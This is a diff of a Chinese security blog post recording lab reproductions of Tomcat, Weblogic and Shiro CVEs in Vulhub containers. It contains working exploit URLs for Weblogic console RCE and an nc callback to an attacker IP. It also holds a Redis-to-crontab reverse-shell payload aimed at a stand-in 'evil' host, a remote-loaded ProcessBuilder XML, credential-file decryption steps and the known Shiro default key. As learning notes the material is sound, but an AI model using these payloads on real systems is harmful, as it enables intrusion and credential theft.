@@ -4,7 +4,7 @@
 我的环境问题─# docker-compose up -d
 Traceback (most recent call last):
   File &amp;quot;/usr/lib/python3/dist-packages/docker/api/cli.."><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Salve" type="application/atom+xml">
-</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Taninluv's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Vulhub_Middleware</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A5%94%E5%AD%90"><span class="toc-text">楔子</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%88%91%E7%9A%84%E7%8E%AF%E5%A2%83%E9%97%AE%E9%A2%98"><span class="toc-text">我的环境问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%81%9C%E6%AD%A2%E5%B9%B6%E5%88%A0%E9%99%A4%E6%89%80%E6%9C%89%E5%AE%B9%E5%99%A8"><span class="toc-text">1. 停止并删除所有容器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%88%A0%E9%99%A4%E6%89%80%E6%9C%89%E9%95%9C%E5%83%8F"><span class="toc-text">2. 删除所有镜像</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E6%83%B3%E7%A1%AE%E4%BF%9D%E5%88%A0%E9%99%A4%E6%89%80%E6%9C%89%E6%97%A0%E7%94%A8%E7%9A%84%E8%B5%84%E6%BA%90%EF%BC%8C%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E4%BB%A5%E4%B8%8B%E6%B8%85%E7%90%86%E5%91%BD%E4%BB%A4%EF%BC%9A"><span class="toc-text">如果想确保删除所有无用的资源，可以使用以下清理命令：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tomcat"><span class="toc-text">Tomcat</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-12615-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">CVE-2017-12615 文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#poc"><span class="toc-text">poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jsp%E6%9C%A8%E9%A9%AC"><span class="toc-text">jsp木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A9-Burp-Suite-%E8%87%AA%E5%8A%A8%E7%AE%A1%E7%90%86-Content-Length"><span class="toc-text">让 Burp Suite 自动管理 Content-Length</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2020-1938-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">CVE-2020-1938 文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#poc-1"><span class="toc-text">poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-1%EF%BC%9A%E4%BD%BF%E7%94%A8-sed"><span class="toc-text">方法 1：使用 sed</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-2%EF%BC%9A%E4%BD%BF%E7%94%A8-grep"><span class="toc-text">方法 2：使用 grep</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-3%EF%BC%9A%E4%BD%BF%E7%94%A8-awk"><span class="toc-text">方法 3：使用 awk</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tomcat8-%EF%BC%88war%EF%BC%89"><span class="toc-text">Tomcat8 （war）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Weblogic"><span class="toc-text">Weblogic</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2023-21839"><span class="toc-text">CVE-2023-21839</span></a></li></ol></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/Middleware"><i class="tag post-item-tag">Middleware</i></a><a href="/tags/Vulhub"><i class="tag post-item-tag">Vulhub</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">Vulhub_Middleware</h1><time class="has-text-grey" datetime="2024-11-05T14:32:35.000Z">2024-11-05</time><article class="mt-2 post-content"><h1 id="楔子"><a href="#楔子" class="headerlink" title="楔子"></a>楔子</h1><p>由于最近也不知道该学什么，怎么学，最关键是要不要学，很迷茫。</p>
+</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Taninluv's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Vulhub_Middleware</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A5%94%E5%AD%90"><span class="toc-text">楔子</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%88%91%E7%9A%84%E7%8E%AF%E5%A2%83%E9%97%AE%E9%A2%98"><span class="toc-text">我的环境问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%81%9C%E6%AD%A2%E5%B9%B6%E5%88%A0%E9%99%A4%E6%89%80%E6%9C%89%E5%AE%B9%E5%99%A8"><span class="toc-text">1. 停止并删除所有容器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%88%A0%E9%99%A4%E6%89%80%E6%9C%89%E9%95%9C%E5%83%8F"><span class="toc-text">2. 删除所有镜像</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E6%83%B3%E7%A1%AE%E4%BF%9D%E5%88%A0%E9%99%A4%E6%89%80%E6%9C%89%E6%97%A0%E7%94%A8%E7%9A%84%E8%B5%84%E6%BA%90%EF%BC%8C%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E4%BB%A5%E4%B8%8B%E6%B8%85%E7%90%86%E5%91%BD%E4%BB%A4%EF%BC%9A"><span class="toc-text">如果想确保删除所有无用的资源，可以使用以下清理命令：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tomcat"><span class="toc-text">Tomcat</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-12615-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">CVE-2017-12615 文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#poc"><span class="toc-text">poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jsp%E6%9C%A8%E9%A9%AC"><span class="toc-text">jsp木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A9-Burp-Suite-%E8%87%AA%E5%8A%A8%E7%AE%A1%E7%90%86-Content-Length"><span class="toc-text">让 Burp Suite 自动管理 Content-Length</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2020-1938-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">CVE-2020-1938 文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#poc-1"><span class="toc-text">poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-1%EF%BC%9A%E4%BD%BF%E7%94%A8-sed"><span class="toc-text">方法 1：使用 sed</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-2%EF%BC%9A%E4%BD%BF%E7%94%A8-grep"><span class="toc-text">方法 2：使用 grep</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-3%EF%BC%9A%E4%BD%BF%E7%94%A8-awk"><span class="toc-text">方法 3：使用 awk</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tomcat8-%EF%BC%88war%EF%BC%89"><span class="toc-text">Tomcat8 （war）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Weblogic"><span class="toc-text">Weblogic</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2023-21839"><span class="toc-text">CVE-2023-21839</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF"><span class="toc-text">SSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#weak-passwd"><span class="toc-text">weak_passwd</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E5%90%8E%E5%8F%B0%E7%94%A8%E6%88%B7%E5%AF%86%E6%96%87%E4%B8%8E%E5%AF%86%E9%92%A5%E6%96%87%E4%BB%B6"><span class="toc-text">读取后台用户密文与密钥文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Weblogic-%E7%AE%A1%E7%90%86%E6%8E%A7%E5%88%B6%E5%8F%B0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-14882%EF%BC%8CCVE-2020-14883%E3%80%81CVE-2019-2725%EF%BC%89"><span class="toc-text">Weblogic 管理控制台未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883、CVE-2019-2725）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shiro"><span class="toc-text">Shiro</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Apache-Shiro-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1957%EF%BC%89"><span class="toc-text">Apache Shiro 认证绕过漏洞（CVE-2020-1957）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#poc-2"><span class="toc-text">poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2010-3863"><span class="toc-text">CVE-2010-3863</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shiro550-CVE-2016-4437"><span class="toc-text">shiro550(CVE-2016-4437)</span></a></li></ol></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/Middleware"><i class="tag post-item-tag">Middleware</i></a><a href="/tags/Vulhub"><i class="tag post-item-tag">Vulhub</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">Vulhub_Middleware</h1><time class="has-text-grey" datetime="2024-11-05T14:32:35.000Z">2024-11-05</time><article class="mt-2 post-content"><h1 id="楔子"><a href="#楔子" class="headerlink" title="楔子"></a>楔子</h1><p>由于最近也不知道该学什么，怎么学，最关键是要不要学，很迷茫。</p>
 <p>之前培训以及前两天跟同事交流都提到了vulhub这个玩意儿，以前看过这东西但是看了两眼觉得只是一些比较老的cve和一个比较方便的普通web靶场，没有想到还可以当知识库使用，这两天仔细看了发现还是有一些比较新的cve，看起来也是持续更新的，于是稍微琢磨了一下，打算先走一下常见中间件的cve，光有个数据库恐怕是不行的，就怕看见了但是认不出来hhh。反正没什么事儿，每天有空了花几分钟搞一个先弄着走吧。。。</p>
 <h1 id="我的环境问题"><a href="#我的环境问题" class="headerlink" title="我的环境问题"></a>我的环境问题</h1><pre><code>─# docker-compose up -d
 Traceback (most recent call last):
@@ -959,4 +959,253 @@ connect to [192.168.1.102] from (UNKNOWN) [172.21.0.2] 39840
 bash: no job control in this shell
 [oracle@304fd45a9ef2 base_domain]$ 
 </code></pre>
-</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><em></em><a class="button is-default" href="/2024/10/28/HTB-CICADA/" title="HTB_CICADA"><span class="has-text-weight-semibold">Next: HTB_CICADA</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="https://github.com/Taninluv/Taninluv.github.io" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/Taninluv"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--></section><p><span>Copyright ©</span><span> Taninluv 2024</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>常规：</p>
+<p>访问<code>http://your-ip:7001/uddiexplorer/</code></p>
+<blockquote>
+<p><code>UDDIExplorer</code> 是 WebLogic Server 提供的一个基于 Web 的用户界面，用于访问和管理 UDDI（Universal Description, Discovery, and Integration，通用描述、发现和集成）注册服务。UDDI 是一种用于发布和发现 Web 服务的标准协议，通常用于企业内部或跨企业环境中查找可重用的 Web 服务。</p>
+</blockquote>
+<p>访问然后抓包：</p>
+<pre><code>POST /uddiexplorer/SearchPublicRegistries.jsp HTTP/1.1
+
+Host: 127.0.0.1:7001
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 143
+
+Origin: http://127.0.0.1:7001
+
+Connection: close
+
+Referer: http://127.0.0.1:7001/uddiexplorer/SearchPublicRegistries.jsp
+
+Cookie: publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ibm.com/services/uddi/v2beta/inquiryapi!IBM V2|http://uddi.rte.microsoft.com/inquire!Microsoft|http://services.xmethods.net/glue/inquire/uddi!XMethods|; ADMINCONSOLESESSION=W72vnxyTy6QH2gDChznw8KcfQvwBX2tbPMcJrfp2xWd2jGv397XL!-1328809793; JSESSIONID=y21nnx1VvJC7nWZwt1jFYXTfTnhtsM1YLLHSkg3S15G67pGKLwPv!-1328809793
+
+Upgrade-Insecure-Requests: 1
+
+Sec-Fetch-Dest: document
+
+Sec-Fetch-Mode: navigate
+
+Sec-Fetch-Site: same-origin
+
+Sec-Fetch-User: ?1
+
+
+
+operator=http%3A%2F%2F172.20.10.4%3a8000&amp;rdoSearch=name&amp;txtSearchname=123&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search
+</code></pre>
+<p>把<code>operator</code>的参数修改为目标网址可以触发ssrf（需要编码特殊符号）</p>
+<blockquote>
+<p>可访问的端口将会得到错误，一般是返回status code（如下图），如果访问的非http协议，则会返回<code>did not have a valid SOAP content-type</code>。</p>
+</blockquote>
+<blockquote>
+<p>修改为一个不存在的端口，将会返回<code>could not connect over HTTP to server</code>。</p>
+</blockquote>
+<p>原shell：</p>
+<pre><code>set 1 &quot;\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c &#39;sh -i &gt;&amp; /dev/tcp/evil/21 0&gt;&amp;1&#39;\n\n\n\n&quot;
+config set dir /etc/
+config set dbfilename crontab
+save
+</code></pre>
+<blockquote>
+<p>GPT:</p>
+<p>这是一组利用 Redis 配置文件创建恶意计划任务的命令。下面逐行解释每个命令的作用：</p>
+<ol>
+<li><p><code>set 1 &quot;\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c &#39;sh -i &gt;&amp; /dev/tcp/evil/21 0&gt;&amp;1&#39;\n\n\n\n&quot;</code></p>
+<ul>
+<li><p>使用 Redis <code>SET</code> 命令将一个字符串写入 Redis 数据库中。这个字符串构造了一个恶意的 Cron 计划任务。</p>
+</li>
+<li><p>该任务设置为每分钟运行一次，命令内容是打开一个反向 shell 连接，即连接到 <code>evil</code> 服务器的 21 端口。这种连接通常用于未授权的远程访问。</p>
+</li>
+</ul>
+</li>
+<li><p><code>config set dir /etc/</code></p>
+<ul>
+<li><p>设置 Redis 的工作目录为 <code>/etc/</code>，即将 Redis 数据库文件的保存路径指定为系统目录 <code>/etc/</code>。</p>
+</li>
+<li><p>这个操作目的是将 Redis 数据库文件保存到系统的 Cron 配置目录中，以便后续在 <code>/etc/crontab</code> 中创建恶意的计划任务。</p>
+</li>
+</ul>
+</li>
+<li><p><code>config set dbfilename crontab</code></p>
+<ul>
+<li><p>将 Redis 的数据库文件名设置为 <code>crontab</code>，即指定 Redis 将数据保存为 <code>/etc/crontab</code> 文件。</p>
+</li>
+<li><p><code>/etc/crontab</code> 是 Linux 系统中的计划任务文件，操作系统会定期读取该文件并执行其中的任务。</p>
+</li>
+</ul>
+</li>
+<li><p><code>save</code></p>
+<ul>
+<li><p>强制 Redis 将数据保存到磁盘中，此时 Redis 将会把包含恶意计划任务的内容写入 <code>/etc/crontab</code> 文件。</p>
+</li>
+<li><p>一旦保存成功，操作系统会读取 <code>/etc/crontab</code> 文件中的新任务，定期执行恶意计划任务。</p>
+</li>
+</ul>
+</li>
+</ol>
+</blockquote>
+<p>然后进行url编码：</p>
+<pre><code>php -r &quot;echo urlencode(&#39;要编码的字符串&#39;);&quot;
+</code></pre>
+<p>注意，换行符是“\r\n”，也就是“%0D%0A”。</p>
+<p>这里我的redis容器无法启动，先跳过</p>
+<blockquote>
+<ul>
+<li>&#x2F;etc&#x2F;crontab 这个是肯定的</li>
+<li>&#x2F;etc&#x2F;cron.d&#x2F;* 将任意文件写到该目录下，效果和crontab相同，格式也要和&#x2F;etc&#x2F;crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。</li>
+<li>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;root centos系统下root用户的cron文件</li>
+<li>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root debian系统下root用户的cron文件</li>
+</ul>
+</blockquote>
+<h2 id="weak-passwd"><a href="#weak-passwd" class="headerlink" title="weak_passwd"></a>weak_passwd</h2><ul>
+<li>弱口令进入后台</li>
+</ul>
+<p>weblogic常用弱口令： <a target="_blank" rel="noopener" href="http://cirt.net/passwords?criteria=weblogic">http://cirt.net/passwords?criteria=weblogic</a></p>
+<ul>
+<li>任意文件读取漏洞获取密码</li>
+</ul>
+<h3 id="读取后台用户密文与密钥文件"><a href="#读取后台用户密文与密钥文件" class="headerlink" title="读取后台用户密文与密钥文件"></a>读取后台用户密文与密钥文件</h3><blockquote>
+<p>weblogic密码使用AES（老版本3DES）加密，对称加密可解密，只需要找到用户的密文与加密时的密钥即可。这两个文件均位于base_domain下，名为<code>SerializedSystemIni.dat</code>和<code>config.xml</code>，在本环境中为<code>./security/SerializedSystemIni.dat</code>和<code>./config/config.xml</code>（基于当前目录<code>/root/Oracle/Middleware/user_projects/domains/base_domain</code>）。</p>
+<p><code>SerializedSystemIni.dat</code>是一个二进制文件，所以一定要用burpsuite来读取，用浏览器直接下载可能引入一些干扰字符。在burp里选中读取到的那一串乱码，右键copy to file就可以保存成一个文件：</p>
+</blockquote>
+<p>看起来网站的根目录在<code>/root/Oracle/Middleware/user_projects/domains/base_domain</code></p>
+<blockquote>
+<p>config.xml是base_domain的全局配置文件，所以乱七八糟的内容比较多，找到其中的<node-manager-password-encrypted>的值，即为加密后的管理员密码，</p>
+</blockquote>
+<pre><code>&lt;node-manager-password-encrypted&gt;&#123;AES&#125;yvGnizbUS0lga6iPA5LkrQdImFiS/DJ8Lw/yeE7Dt0k=&lt;/node-manager-password-encrypted&gt;
+</code></pre>
+<p><img src="/img/image-20241112104939975.png" alt="image-20241112104939975"></p>
+<p>（这里需要低版本的java才能运行，但是GPT一下好像没有特别中意的java虚拟环境工具，后面再看看吧）</p>
+<p>最后解密出密码正确。</p>
+<h2 id="Weblogic-管理控制台未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883、CVE-2019-2725）"><a href="#Weblogic-管理控制台未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883、CVE-2019-2725）" class="headerlink" title="Weblogic 管理控制台未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883、CVE-2019-2725）"></a>Weblogic 管理控制台未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883、CVE-2019-2725）</h2><p>权限绕过漏洞（CVE-2020-14882），访问以下URL，即可未授权访问到管理后台页面：</p>
+<pre><code>http://127.0.0.1:7001/console/css/%252e%252e%252fconsole.portal
+</code></pre>
+<p><code>%252e%252e%e%252f</code> 是<code>../</code>的url双重编码</p>
+<blockquote>
+<p>访问后台后，可以发现我们现在是低权限的用户，无法安装应用，所以也无法直接执行任意代码</p>
+</blockquote>
+<blockquote>
+<p>此时需要利用到第二个漏洞CVE-2020-14883。这个漏洞的利用方式有两种，一是通过<code>com.tangosol.coherence.mvel2.sh.ShellSession</code>，二是通过<code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code>。</p>
+</blockquote>
+<p>直接访问如下URL，即可利用<code>com.tangosol.coherence.mvel2.sh.ShellSession</code>执行命令：</p>
+<pre><code>http://127.0.0.1:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#39;echo+hello+%7C+nc+-q+1+172.20.10.4+9001&#39;);&quot;)
+</code></pre>
+<p>发现没有nc，<code>touch+%2Ftmp%2Fpwn</code></p>
+<p>执行成功</p>
+<p>看一下另一个链子（CVE-2019-2725）<code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code>：</p>
+<p>需要构造一个XML文件</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
+&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;
+   xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+   xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;
+    &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;
+        &lt;constructor-arg&gt;
+          &lt;list&gt;
+            &lt;value&gt;bash&lt;/value&gt;
+            &lt;value&gt;-c&lt;/value&gt;
+            &lt;value&gt;&lt;![CDATA[touch /tmp/success2]]&gt;&lt;/value&gt;
+          &lt;/list&gt;
+        &lt;/constructor-arg&gt;
+    &lt;/bean&gt;
+&lt;/beans&gt;
+</code></pre>
+<p>然后通过如下URL，即可让Weblogic加载这个XML，并执行其中的命令：</p>
+<pre><code>http://your-ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://example.com/rce.xml&quot;)
+</code></pre>
+<p>&#x3D;&#x3D;&gt;</p>
+<pre><code>http://127.0.0.1:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://172.20.10.4:8000/exp.xml&quot;)
+</code></pre>
+<p>界面虽然返回404，但是在docker中可以看到命令执行成功了</p>
+<p><span style="color:gray;">weblogic剩下几个cve比较老了，先跳过。</span></p>
+<p><span style="color:gray;">待续…</span></p>
+<h1 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h1><h2 id="Apache-Shiro-认证绕过漏洞（CVE-2020-1957）"><a href="#Apache-Shiro-认证绕过漏洞（CVE-2020-1957）" class="headerlink" title="Apache Shiro 认证绕过漏洞（CVE-2020-1957）"></a>Apache Shiro 认证绕过漏洞（CVE-2020-1957）</h2><p>在Apache Shiro 1.5.2以前的版本中，在使用Spring动态控制器时，攻击者通过构造<code>..;</code>这样的跳转，可以绕过Shiro中对目录的权限限制。</p>
+<h2 id="poc-2"><a href="#poc-2" class="headerlink" title="poc"></a>poc</h2><p>直接请求管理页面<code>/admin/</code>，无法访问，将会被重定向到登录页面,构造恶意请求<code>/xxx/..;/admin/</code>，即可绕过权限校验，访问到管理页面。</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8281?time__1311=n4+xnD0Dc7eE5DsAYxCq7K40ImRfj6haoD">CVE-2020-1957 Apache Shiro Servlet未授权访问浅析 - 先知社区</a></p>
+<p>需要注意<code>/xxx/</code>可以换成其他无法被解析到的路径，如果使用<code>login.html</code>这样的可能会被shiro转到其他解析方式导致复现失败。</p>
+<h2 id="CVE-2010-3863"><a href="#CVE-2010-3863" class="headerlink" title="CVE-2010-3863"></a>CVE-2010-3863</h2><p>在Apache Shiro 1.1.0以前的版本中，shiro 进行权限验证前未对url 做标准化处理，攻击者可以构造<code>/</code>、<code>//</code>、<code>/./</code>、<code>/../</code> 等绕过权限验证</p>
+<p>构造恶意请求<code>/./admin</code>，即可绕过权限校验，访问到管理页面</p>
+<h2 id="shiro550-CVE-2016-4437"><a href="#shiro550-CVE-2016-4437" class="headerlink" title="shiro550(CVE-2016-4437)"></a>shiro550(CVE-2016-4437)</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Bossfrank/article/details/130173880">shiro550反序列化漏洞原理与漏洞复现（基于vulhub，保姆级的详细教程）_shiro550原理-CSDN博客</a></p>
+<blockquote>
+<p>这里出现问题的点就在于AES加解密的过程中使用的密钥key。AES是一种对称密钥密码体制，加解密用到是相同的密钥，这个密钥应该是绝对保密的，但在shiro版本&lt;&#x3D;1.2.24的版本中使用了固定的密钥kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;，这样攻击者直接就可以用这个密钥实现上述加密过程，在Cookie字段写入想要服务端执行的恶意代码，最后服务端在对cookie进行解密的时候（反序列化后）就会执行恶意代码。在后续的版本中，这个密钥也可能会被爆破出来，从而被攻击者利用构造payload。</p>
+</blockquote>
+<blockquote>
+<p>其漏洞的核心成因是cookie中的身份信息进行了AES加解密，用于加解密的密钥应该是绝对保密的，但在shiro版本&lt;&#x3D;1.2.24的版本中使用了固定的密钥。因此，验证漏洞的核心应该还是在于我们（攻击者）可否获得这个AES加密的密钥，如果确实是固定的密钥kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;或者其他我们可以通过脚本工具爆破出来的密钥，那么shiro550漏洞才一定存在。</p>
+</blockquote>
+<p>靶场搭建后直接用工具包中的shiro利用工具直接rce了，再看看博主的trail：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/insightglacier/Shiro_exploit">insightglacier&#x2F;Shiro_exploit: Apache Shiro 反序列化漏洞检测与利用工具</a></p>
+<p>使用工具探测，（jdk1.8 python2.7）</p>
+<pre><code>
+</code></pre>
+<blockquote>
+<p>如果运行该脚本时报错No module named ‘Crypto’，则运行如下命令：</p>
+<pre><code class="bash">pip uninstall crypto pycryptodome
+pip install pycryptodome
+</code></pre>
+</blockquote>
+<p>但是搞不出来，说是2.7不提供pip支持了，不知道是我环境的问题还是啥，先这样，跳过探测。</p>
